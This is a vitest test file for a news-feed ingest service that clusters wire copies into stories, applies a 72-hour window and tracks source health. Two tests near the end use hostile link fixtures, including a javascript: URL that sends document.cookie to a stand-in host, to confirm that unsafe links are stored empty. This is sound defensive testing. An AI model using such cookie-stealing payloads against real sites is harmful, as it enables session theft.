import { beforeEach, describe, expect, it } from 'vitest';

import { IngestService } from './ingest-service.js';
import type {
  FeedFetcher,
  RawFeed,
  RawFeedEntry,
} from './feed-fetcher.js';
import type { SourceRepo } from '../repos/source-repo.js';
import type { ArticleRepo } from '../repos/article-repo.js';
import type { StoryRepo } from '../repos/story-repo.js';
import type { EntityRepo } from '../repos/entity-repo.js';
import { DrizzleSourceRepo } from '../repos/source-repo.js';
import { DrizzleArticleRepo } from '../repos/article-repo.js';
import { DrizzleStoryRepo } from '../repos/story-repo.js';
import { DrizzleEntityRepo } from '../repos/entity-repo.js';
import { createTestDb } from '../testing/test-db.js';
import {
  deterministicRandom,
  makeTestClock,
  resetDeterministic,
} from '../testing/test-clocks.js';
import { UNRELATED_REPORTS, WIRE_COPIES } from '../testing/story-fixtures.js';
import type { Source, SourceId } from '../domain/types.js';
import { isSafeExternalUrl } from '../domain/url.js';

class StaticFeedFetcher implements FeedFetcher {
  constructor(private readonly feed: RawFeed) {}
  async fetch(_url: string): Promise<RawFeed> {
    return this.feed;
  }
}

class FailingFeedFetcher implements FeedFetcher {
  constructor(private readonly message: string) {}
  async fetch(): Promise<RawFeed> {
    throw new Error(this.message);
  }
}

function makeEntry(
  externalId: string,
  publishedAt: Date,
  title: string,
  body: string,
): RawFeedEntry {
  return {
    externalId,
    url: `https://www.reuters.com/article/${externalId}`,
    title,
    body,
    publishedAt,
  };
}

const HOUR = 60 * 60 * 1000;

/** A feed of one story as a syndication desk would have delivered it. */
const WIRE_ENTRIES: readonly RawFeedEntry[] = WIRE_COPIES.map((copy, i) =>
  makeEntry(
    `wire-${i}`,
    new Date(new Date('2026-09-02T10:00:00Z').getTime() + i * 60_000),
    copy.headline,
    copy.body,
  ),
);

/** A feed of reports about six different things, published in the same window. */
const UNRELATED_ENTRIES: readonly RawFeedEntry[] = UNRELATED_REPORTS.map(
  (report, i) =>
    makeEntry(
      `unrelated-${i}`,
      new Date(new Date('2026-09-02T10:00:00Z').getTime() + i * 10 * 60_000),
      report.headline,
      report.body,
    ),
);

const CLUSTER_B_ENTRIES: readonly RawFeedEntry[] = [
  makeEntry(
    'b-1',
    new Date('2026-09-02T12:00:00Z'),
    'BrandX Inc acquires TinyCo',
    'BrandX Inc said it had completed the acquisition of TinyCo for $2 billion, ending a process that began nine months ago. Shares in BrandX rose 4 percent in afternoon trading.',
  ),
  makeEntry(
    'b-2',
    new Date('2026-09-02T12:30:00Z'),
    'BrandX Inc completes TinyCo acquisition',
    'The $2 billion TinyCo takeover is complete, BrandX Inc said, after nine months of negotiations. Shares in BrandX rose 4 percent in afternoon trading.',
  ),
  makeEntry(
    'b-3',
    new Date('2026-09-02T13:00:00Z'),
    'TinyCo bought by BrandX Inc for $2 billion',
    'BrandX Inc has finished buying TinyCo for $2 billion, the company said on Tuesday. Shares in BrandX rose 4 percent in afternoon trading.',
  ),
];

interface BuildResult {
  readonly service: IngestService;
  readonly sourceRepo: SourceRepo;
  readonly articleRepo: ArticleRepo;
  readonly storyRepo: StoryRepo;
  readonly entityRepo: EntityRepo;
  readonly source: Source;
  readonly clock: ReturnType<typeof makeTestClock>;
  readonly replaceFetcher: (f: FeedFetcher) => void;
}

interface BuildInput {
  readonly entries?: RawFeed;
  readonly pollAt?: Date;
  readonly feedUrl?: string | null;
  readonly sourceId?: SourceId;
  readonly fetcher?: FeedFetcher;
}

async function buildService(input: BuildInput): Promise<BuildResult> {
  const { db } = createTestDb();
  const sr = new DrizzleSourceRepo(db);
  const ar = new DrizzleArticleRepo(db);
  const str = new DrizzleStoryRepo(db);
  const er = new DrizzleEntityRepo(db);

  const source: Source = {
    id: input.sourceId ?? ('reuters' as SourceId),
    slug: 'reuters',
    name: 'Reuters',
    homepageUrl: 'https://www.reuters.com',
    feedUrl:
      input.feedUrl === undefined
        ? 'https://www.reuters.com/rss/topNews'
        : input.feedUrl,
    lastPolledAt: null,
    lastSuccessAt: null,
  };
  await sr.insert(source);

  const pollAt = input.pollAt ?? new Date('2026-09-02T12:00:00Z');
  const clock = makeTestClock(pollAt);

  const initialFetcher: FeedFetcher =
    input.fetcher ??
    new StaticFeedFetcher(input.entries ?? { entries: [] });

  let activeFetcher: FeedFetcher = initialFetcher;

  const service = new IngestService({
    sourceRepo: sr,
    articleRepo: ar,
    storyRepo: str,
    entityRepo: er,
    feedFetcher: {
      fetch(url: string): Promise<RawFeed> {
        return activeFetcher.fetch(url);
      },
    },
    clock: clock.clock,
    random: deterministicRandom,
  });

  return {
    service,
    sourceRepo: sr,
    articleRepo: ar,
    storyRepo: str,
    entityRepo: er,
    source,
    clock,
    replaceFetcher(f: FeedFetcher): void {
      activeFetcher = f;
    },
  };
}

async function storyIdsFor(
  articleRepo: ArticleRepo,
  source: Source,
  entries: readonly RawFeedEntry[],
): Promise<Set<string>> {
  const ids = new Set<string>();
  for (const entry of entries) {
    const article = await articleRepo.findByExternalId(source.id, entry.externalId);
    if (article?.storyId) ids.add(article.storyId);
  }
  return ids;
}

describe('IngestService', () => {
  beforeEach(() => {
    resetDeterministic();
  });

  it('collapses 22 genuinely varied wire copies of one story into a single Story', async () => {
    const { service, storyRepo, articleRepo, source } = await buildService({
      entries: { entries: WIRE_ENTRIES },
    });

    const report = await service.ingestSource(source.id);

    expect(report.success).toBe(true);
    expect(report.fetched).toBe(22);
    expect(report.inserted + report.merged).toBe(22);
    expect(report.storiesAffected).toBe(1);

    // Every copy has a different headline and a different body, so this is not
    // the same input twenty-two times over.
    expect(new Set(WIRE_ENTRIES.map((e) => e.body)).size).toBe(22);
    expect(new Set(WIRE_ENTRIES.map((e) => e.title)).size).toBe(22);

    const seenStoryIds = await storyIdsFor(articleRepo, source, WIRE_ENTRIES);
    expect(seenStoryIds.size).toBe(1);
    const storyId = seenStoryIds.values().next().value as string;
    const story = await storyRepo.getById(storyId as never);
    expect(story?.articleCount).toBe(22);
  });

  it('keeps unrelated reports from the same window in separate Stories', async () => {
    const { service, storyRepo, articleRepo, source } = await buildService({
      entries: { entries: UNRELATED_ENTRIES },
    });

    const report = await service.ingestSource(source.id);

    expect(report.success).toBe(true);
    expect(report.storiesAffected).toBe(UNRELATED_REPORTS.length);
    const seenStoryIds = await storyIdsFor(articleRepo, source, UNRELATED_ENTRIES);
    expect(seenStoryIds.size).toBe(UNRELATED_REPORTS.length);
    for (const id of seenStoryIds) {
      const story = await storyRepo.getById(id as never);
      expect(story?.articleCount).toBe(1);
    }
  });

  it('persists the key phrases it signed an Article with, and reads them back', async () => {
    const { service, articleRepo, source } = await buildService({
      entries: { entries: [WIRE_ENTRIES[0]!] },
    });
    await service.ingestSource(source.id);

    const stored = await articleRepo.findByExternalId(source.id, 'wire-0');
    expect(stored).not.toBeNull();
    // Half of the matching key used to live only in memory during ingest and was
    // always read back empty.
    expect(stored?.signature.phrases.length).toBeGreaterThan(0);
    expect(stored?.signature.words.length).toBeGreaterThan(0);
    expect(stored?.signature.phrases).toContain('acme corp unveiled');
  });

  it('measures the dedup window from when an Article was published, not from when it was polled', async () => {
    // A feed that still lists a report from last week alongside today's. Both
    // are the same story in the same poll, and a window measured from the poll
    // would fold them into one Story.
    const copy = WIRE_COPIES[0]!;
    const pollAt = new Date('2026-09-02T12:00:00Z');
    const stale = new Date(pollAt.getTime() - 5 * 24 * HOUR);
    const entries: RawFeedEntry[] = [
      makeEntry('stale', stale, 'Acme unveils Foo, an AI assistant', copy.body),
      makeEntry(
        'current',
        pollAt,
        'Acme launches AI assistant Foo',
        WIRE_COPIES[1]!.body,
      ),
    ];
    const { service, storyRepo, articleRepo, source } = await buildService({
      entries: { entries },
      pollAt,
    });

    const report = await service.ingestSource(source.id);

    expect(report.success).toBe(true);
    expect(report.storiesAffected).toBe(2);
    const staleStoryId = (
      await articleRepo.findByExternalId(source.id, 'stale')
    )?.storyId;
    const currentStoryId = (
      await articleRepo.findByExternalId(source.id, 'current')
    )?.storyId;
    expect(staleStoryId).not.toBeNull();
    expect(staleStoryId).not.toBe(currentStoryId);
    expect((await storyRepo.getById(staleStoryId as never))?.articleCount).toBe(1);
    expect((await storyRepo.getById(currentStoryId as never))?.articleCount).toBe(
      1,
    );
  });

  it('clusters two distinct stories into separate Stories with correct article counts', async () => {
    const entries = [...WIRE_ENTRIES, ...CLUSTER_B_ENTRIES];
    const { service, storyRepo, articleRepo, source } = await buildService({
      entries: { entries },
    });
    const report = await service.ingestSource(source.id);
    expect(report.success).toBe(true);
    expect(report.storiesAffected).toBe(2);
    expect(report.fetched).toBe(entries.length);
    expect(report.inserted + report.merged).toBe(entries.length);

    const storyIds = new Set<string>();
    for (const e of entries) {
      const a = await articleRepo.findByExternalId(source.id, e.externalId);
      if (a?.storyId) storyIds.add(a.storyId);
    }
    expect(storyIds.size).toBe(2);

    const counts: number[] = [];
    for (const id of storyIds) {
      const articles = await articleRepo.listByStory(id as never);
      counts.push(articles.length);
    }
    expect([...counts].sort((a, b) => a - b)).toEqual([3, 22]);

    for (const id of storyIds) {
      const story = await storyRepo.getById(id as never);
      expect(story).not.toBeNull();
    }
  });

  it('is idempotent: re-ingesting the same feed reports no new merges', async () => {
    const entries = [...WIRE_ENTRIES, ...CLUSTER_B_ENTRIES];
    const { service, storyRepo, articleRepo, source } = await buildService({
      entries: { entries },
    });
    const r1 = await service.ingestSource(source.id);
    expect(r1.inserted + r1.merged).toBe(entries.length);
    const storyIdsAfterFirst = await storyIdsFor(articleRepo, source, entries);

    const r2 = await service.ingestSource(source.id);
    expect(r2.inserted).toBe(0);
    expect(r2.merged).toBe(0);
    expect(r2.fetched).toBe(entries.length);

    // And nothing moved: a second pass over the same feed is the same Stories.
    expect(await storyIdsFor(articleRepo, source, entries)).toEqual(
      storyIdsAfterFirst,
    );
    const counts: number[] = [];
    for (const id of storyIdsAfterFirst) {
      const story = await storyRepo.getById(id as never);
      counts.push(story?.articleCount ?? 0);
    }
    expect(counts.sort((a, b) => a - b)).toEqual([
      CLUSTER_B_ENTRIES.length,
      WIRE_ENTRIES.length,
    ]);
  });

  it('skips a source whose feed_url is null', async () => {
    const { service, sourceRepo, source } = await buildService({
      feedUrl: null,
    });
    const report = await service.ingestSource(source.id);
    expect(report.success).toBe(false);
    expect(report.error).toBe('no_feed_url');
    const after = await sourceRepo.getById(source.id);
    expect(after?.lastPolledAt).not.toBeNull();
    expect(after?.lastSuccessAt).toBeNull();
  });

  it('records a fetch error and does not record success', async () => {
    const { service, sourceRepo, source } = await buildService({
      fetcher: new FailingFeedFetcher('upstream 503'),
    });
    const report = await service.ingestSource(source.id);
    expect(report.success).toBe(false);
    expect(report.error).toMatch(/upstream 503/);
    const after = await sourceRepo.getById(source.id);
    expect(after?.lastPolledAt).not.toBeNull();
    expect(after?.lastSuccessAt).toBeNull();
  });

  it('returns a not_found error when the source id is unknown', async () => {
    const { service } = await buildService({});
    const report = await service.ingestSource('no-such-source' as SourceId);
    expect(report.success).toBe(false);
    expect(report.error).toBe('source_not_found');
    expect(report.storiesAffected).toBe(0);
  });

  it('persists the linked entities for each article', async () => {
    const { service, articleRepo, source } = await buildService({
      entries: { entries: WIRE_ENTRIES.slice(0, 2) },
    });
    await service.ingestSource(source.id);

    const sample = await articleRepo.findByExternalId(source.id, 'wire-0');
    expect(sample).not.toBeNull();
    expect(sample?.entities.length).toBeGreaterThan(0);
    const names = sample?.entities.map((e) => e.canonicalName) ?? [];
    expect(names).toContain('Acme Corp');

    // The same canonical entity is one row reused across Articles, not a fresh
    // one per Article, or nothing downstream can group by it.
    const sample2 = await articleRepo.findByExternalId(source.id, 'wire-1');
    const idOf = (article: typeof sample, name: string): string | undefined =>
      article?.entities.find((e) => e.canonicalName === name)?.id;
    expect(idOf(sample2, 'Acme Corp')).toBe(idOf(sample, 'Acme Corp'));
  });

  it('touches the story lastSeenAt when a new article merges into it', async () => {
    const firstEntry = WIRE_ENTRIES[0]!;
    const secondEntry = WIRE_ENTRIES[1]!;
    const { service, storyRepo, articleRepo, source, clock, replaceFetcher } =
      await buildService({
        entries: { entries: [firstEntry] },
      });
    const t0 = clock.clock.now();
    await service.ingestSource(source.id);

    const initialStoryId = (
      await articleRepo.findByExternalId(source.id, firstEntry.externalId)
    )?.storyId;
    expect(initialStoryId).not.toBeNull();
    if (!initialStoryId) throw new Error('expected a story id');
    const initialStory = await storyRepo.getById(initialStoryId as never);
    const firstSeen = initialStory?.firstSeenAt;
    expect(firstSeen?.getTime()).toBe(t0.getTime());

    clock.advance(HOUR);
    const t1 = clock.clock.now();
    replaceFetcher(
      new StaticFeedFetcher({
        entries: [secondEntry],
      }),
    );
    await service.ingestSource(source.id);

    const updated = await storyRepo.getById(initialStoryId as never);
    expect(updated?.lastSeenAt.getTime()).toBe(t1.getTime());
    expect(updated?.firstSeenAt.getTime()).toBe(firstSeen?.getTime());
  });

  it('widens the story published range as copies published around it arrive', async () => {
    const first = WIRE_ENTRIES[0]!;
    const later = {
      ...WIRE_ENTRIES[1]!,
      externalId: 'wire-later',
      publishedAt: new Date(first.publishedAt.getTime() + 30 * HOUR),
    };
    const { service, storyRepo, articleRepo, source, replaceFetcher } =
      await buildService({
        entries: { entries: [first] },
      });
    await service.ingestSource(source.id);
    const storyId = (
      await articleRepo.findByExternalId(source.id, 'wire-0')
    )?.storyId;
    if (!storyId) throw new Error('expected a story id');

    replaceFetcher(new StaticFeedFetcher({ entries: [later] }));
    await service.ingestSource(source.id);

    const story = await storyRepo.getById(storyId as never);
    expect(story?.articleCount).toBe(2);
    expect(story?.published.first).toEqual(first.publishedAt);
    expect(story?.published.last).toEqual(later.publishedAt);
  });

  it('does not merge articles that were published more than 72 hours apart', async () => {
    const copy = WIRE_COPIES[0]!;
    const t0 = new Date('2026-09-01T10:00:00Z');
    const tPast = new Date('2026-09-02T10:00:00Z');
    const tFuture = t0.getTime() + 5 * 24 * HOUR;
    const { service, storyRepo, articleRepo, source, replaceFetcher, clock } =
      await buildService({
        entries: {
          entries: [
            {
              ...makeEntry('old', t0, copy.headline, copy.body),
            },
          ],
        },
        pollAt: tPast,
      });
    await service.ingestSource(source.id);

    const initialStoryId = (
      await articleRepo.findByExternalId(source.id, 'old')
    )?.storyId;
    expect(initialStoryId).not.toBeNull();
    const before = await storyRepo.getById(initialStoryId as never);
    expect(before?.articleCount).toBe(1);

    clock.set(tFuture);
    replaceFetcher(
      new StaticFeedFetcher({
        entries: [
          makeEntry('new', new Date(tFuture), copy.headline, WIRE_COPIES[1]!.body),
        ],
      }),
    );
    const r2 = await service.ingestSource(source.id);
    expect(r2.success).toBe(true);
    expect(r2.storiesAffected).toBe(1);
    expect(r2.merged).toBe(0);
    expect(r2.inserted).toBe(1);

    const newStoryId = (
      await articleRepo.findByExternalId(source.id, 'new')
    )?.storyId;
    expect(newStoryId).not.toBeNull();
    expect(newStoryId).not.toBe(initialStoryId);

    const old = await storyRepo.getById(initialStoryId as never);
    expect(old?.articleCount).toBe(1);
    const fresh = await storyRepo.getById(newStoryId as never);
    expect(fresh?.articleCount).toBe(1);
  });

  it('does not let a chain of in-window copies walk a Story out of its window', async () => {
    // Each of these Articles is inside 72 hours of the one before it, so a Story
    // that accepted all of them would span more than two months — which is the
    // same mistake as measuring the window from when a poll happened.
    const first = WIRE_ENTRIES[0]!;
    const entries: RawFeedEntry[] = [first];
    for (let i = 1; i < 8; i++) {
      entries.push({
        ...WIRE_ENTRIES[i]!,
        externalId: `chain-${i}`,
        publishedAt: new Date(first.publishedAt.getTime() + i * 60 * HOUR),
      });
    }
    const { service, storyRepo, articleRepo, source } = await buildService({
      entries: { entries },
      pollAt: new Date(first.publishedAt.getTime() + 7 * 60 * HOUR),
    });

    await service.ingestSource(source.id);

    // The invariant that matters is not how many Stories this made, but that no
    // Story ended up wider than the window: a chain of near-duplicates can open
    // new Stories, never stretch one.
    const storyIds = await storyIdsFor(articleRepo, source, entries);
    expect(storyIds.size).toBeGreaterThan(1);
    for (const id of storyIds) {
      const story = await storyRepo.getById(id as never);
      const spanHours =
        (story!.published.last.getTime() - story!.published.first.getTime()) /
        HOUR;
      expect(spanHours, `story ${id} spans ${spanHours}h`).toBeLessThanOrEqual(72);
    }
  });

  it('merges copies published inside the 72-hour window', async () => {
    const copy = WIRE_COPIES[0]!;
    const t0 = new Date('2026-09-01T10:00:00Z');
    const tInside = new Date('2026-09-02T10:00:00Z');
    const tJustInside = t0.getTime() + 71 * HOUR;
    const { service, storyRepo, articleRepo, source, replaceFetcher, clock } =
      await buildService({
        entries: {
          entries: [makeEntry('first', t0, copy.headline, copy.body)],
        },
        pollAt: tInside,
      });
    await service.ingestSource(source.id);
    clock.set(new Date(tJustInside));

    replaceFetcher(
      new StaticFeedFetcher({
        entries: [
          makeEntry(
            'second',
            new Date(tJustInside),
            WIRE_COPIES[1]!.headline,
            WIRE_COPIES[1]!.body,
          ),
        ],
      }),
    );
    const r2 = await service.ingestSource(source.id);
    expect(r2.storiesAffected).toBe(1);
    expect(r2.merged).toBe(1);

    const firstStoryId = (
      await articleRepo.findByExternalId(source.id, 'first')
    )?.storyId;
    const secondStoryId = (
      await articleRepo.findByExternalId(source.id, 'second')
    )?.storyId;
    expect(firstStoryId).toBe(secondStoryId);
    const merged = firstStoryId
      ? await storyRepo.getById(firstStoryId as never)
      : null;
    expect(merged?.articleCount).toBe(2);
  });

  it('records a success when a poll finds nothing new, so a healthy Source is not reported stale', async () => {
    const entry = WIRE_ENTRIES[0]!;
    const { service, sourceRepo, source, clock, replaceFetcher } = await buildService({
      entries: { entries: [entry] },
    });

    const first = await service.ingestSource(source.id);
    expect(first.success).toBe(true);
    const firstSuccessAt = (await sourceRepo.getById(source.id))?.lastSuccessAt;
    expect(firstSuccessAt).not.toBeNull();

    // The second poll sees the same feed and inserts nothing. It still worked,
    // so the Source's last success has to move or the dashboard calls it stale.
    clock.advance(HOUR);
    replaceFetcher(new StaticFeedFetcher({ entries: [entry] }));
    const second = await service.ingestSource(source.id);
    expect(second.success).toBe(true);
    expect(second.inserted).toBe(0);
    expect(second.merged).toBe(0);

    const secondSuccessAt = (await sourceRepo.getById(source.id))?.lastSuccessAt;
    expect(secondSuccessAt).not.toBeNull();
    expect(secondSuccessAt!.getTime()).toBeGreaterThan(firstSuccessAt!.getTime());
  });

  it('records a success for an empty feed', async () => {
    const { service, sourceRepo, source } = await buildService({
      entries: { entries: [] },
    });

    const report = await service.ingestSource(source.id);

    expect(report.success).toBe(true);
    expect((await sourceRepo.getById(source.id))?.lastSuccessAt).not.toBeNull();
  });

  it('stores a link the feed gave us only when the scheme is safe to link to', async () => {
    const copy = WIRE_COPIES[0]!.body;
    const entries: RawFeedEntry[] = [
      makeEntry(
        'good',
        new Date('2026-09-02T10:00:00Z'),
        'Acme Corp ships a widget',
        copy,
      ),
      {
        externalId: 'hostile-js',
        url: 'javascript:fetch("https://evil.example/"+document.cookie)',
        title: 'Acme Corp ships a gadget',
        body: copy,
        publishedAt: new Date('2026-09-02T10:05:00Z'),
      },
      {
        externalId: 'hostile-data',
        url: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        title: 'Acme Corp ships a gizmo',
        body: copy,
        publishedAt: new Date('2026-09-02T10:10:00Z'),
      },
    ];
    const { service, articleRepo, source } = await buildService({
      entries: { entries },
    });

    const report = await service.ingestSource(source.id);

    // The Articles are still kept: their text is what clustering works from.
    expect(report.success).toBe(true);
    expect(report.inserted + report.merged).toBe(3);
    for (const e of entries) {
      const stored = await articleRepo.findByExternalId(source.id, e.externalId);
      expect(stored, e.externalId).not.toBeNull();
      // The invariant is that nothing stored is a link a browser will navigate
      // somewhere unexpected. An empty url is that: there is no link to click.
      const navigable = stored!.url !== '' && isSafeExternalUrl(stored!.url);
      expect(
        stored!.url === '' || navigable,
        `${e.externalId} stored ${JSON.stringify(stored!.url)}`,
      ).toBe(true);
    }
    expect((await articleRepo.findByExternalId(source.id, 'good'))?.url).toBe(
      'https://www.reuters.com/article/good',
    );
    // A refused link is stored as nothing rather than as a sentinel a renderer
    // has to know to check.
    expect((await articleRepo.findByExternalId(source.id, 'hostile-js'))?.url).toBe('');
    expect((await articleRepo.findByExternalId(source.id, 'hostile-data'))?.url).toBe('');
  });

  it('keeps a hostile entry in the Story its safe siblings would join', async () => {
    const copy = WIRE_COPIES[0]!;
    const { service, storyRepo, articleRepo, source } = await buildService({
      entries: {
        entries: [
          makeEntry(
            'safe-one',
            new Date('2026-09-02T10:00:00Z'),
            copy.headline,
            copy.body,
          ),
          {
            externalId: 'hostile',
            url: 'javascript:alert(1)',
            title: WIRE_COPIES[1]!.headline,
            body: WIRE_COPIES[1]!.body,
            publishedAt: new Date('2026-09-02T10:05:00Z'),
          },
        ],
      },
    });

    await service.ingestSource(source.id);

    const safeStory = (
      await articleRepo.findByExternalId(source.id, 'safe-one')
    )?.storyId;
    const hostileStory = (
      await articleRepo.findByExternalId(source.id, 'hostile')
    )?.storyId;
    expect(safeStory).not.toBeNull();
    expect(hostileStory).not.toBeNull();
    // Same event, differently worded; the difference is only the link.
    expect(hostileStory).toBe(safeStory);
    const story = await storyRepo.getById(safeStory as never);
    expect(story?.articleCount).toBe(2);
  });
});
